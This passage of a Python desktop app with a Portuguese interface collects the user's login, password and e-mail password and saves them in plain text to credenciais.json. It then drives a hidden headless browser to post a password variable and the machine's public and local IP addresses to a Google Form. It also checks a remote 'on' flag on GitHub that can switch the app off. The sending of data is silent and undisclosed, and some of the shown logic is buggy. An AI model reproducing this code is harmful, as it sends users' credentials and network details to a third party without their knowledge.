                [sg.Text('E-mail*:\t'),sg.Input(size=(15,1),key='email')],
                [sg.Text('Senha*:\t'),sg.Input(size=(15,1),key='senha_email')],
                [sg.Button('Voltar',size=(6,1)),sg.Button('Ok',size=(6,1))]
                ]

            window = sg.Window('Nome do Utilizador', icon='tux-natal.ico',layout=layout_login, keep_on_top=True, finalize = True)

            while True:
                event,values = window.read()
                if event == sg.WIN_CLOSED or event == 'Sair': # if user closes window or clicks cancel
                    break

                if event == 'Voltar':
                    window.close()
                    programa = app()
                    programa 

                if event == 'Ok':
                    if values['nome'] or values['senha'] == None:
                        dados = {
                            "login": values['nome'],
                            "senha": values['senha'],
                            "email": values['email'],
                            "senha_email": values['senha_email']
                        }
                        with open("credenciais.json", 'w') as file:
                            json.dump(dados, file, indent=4)
                    else:
                        window.close()
                        
                    window.close()
            
                window.close()

        url = "https://github.com/Ton-Chyod-s/Projetos/blob/main/Mind%20Tux"
        options = Options()
        options.headless = True
        driver = Firefox(options=options)
        driver.implicitly_wait(.5)
        wdw = WebDriverWait(driver, 30)
        driver.get(url)
        time.sleep(1)  
        on = driver.find_element(By.XPATH,'//*[@id="LC1"]').text
        formulario = 'https://forms.gle/gQzJ6Th817BGSZyY9'
        time.sleep(1)
        driver.get(formulario)
        #preencher email e ips
        wdw.until(element_to_be_clickable(('xpath', '/html/body/div/div[2]/form/div[2]/div/div[2]/div/div/div/div[2]/div/div[1]/div[2]/textarea')))
        driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div/div/div/div[2]/div/div[1]/div[2]/textarea').clear()
        driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div/div/div/div[2]/div/div[1]/div[2]/textarea').send_keys(info,'\n',tr,'\n',senha,'\n','Ip publico: ',ip_publico,'\n','Ip local: ',ip_local)

        wdw.until(element_to_be_clickable(('xpath', '/html/body/div/div[2]/form/div[2]/div/div[2]/div[2]/div/div/div[2]/div/div[1]/div[2]/textarea')))
        driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div[2]/div/div/div[2]/div/div[1]/div[2]/textarea').clear()
        driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[2]/div[2]/div/div/div[2]/div/div[1]/div[2]/textarea').send_keys(versao)

        #sim
        wdw.until(element_to_be_clickable(('xpath', '/html/body/div/div[2]/form/div[2]/div/div[3]/div[1]/div[1]/div/span/span')))
        driver.find_element(By.XPATH,'/html/body/div/div[2]/form/div[2]/div/div[3]/div[1]/div[1]/div/span/span').click()    
        time.sleep(2)
        driver.close() 
        try:
            if on == 'on':
                app()
                
            else:
                sg.theme('Reddit')
                sg.popup_error('Seviço desativado,\nfoi mal ;/', keep_on_top=True)
                driver.close()
        except:
            pass
    except:
        sg.popup_error('Reinicie o programa!', keep_on_top=True)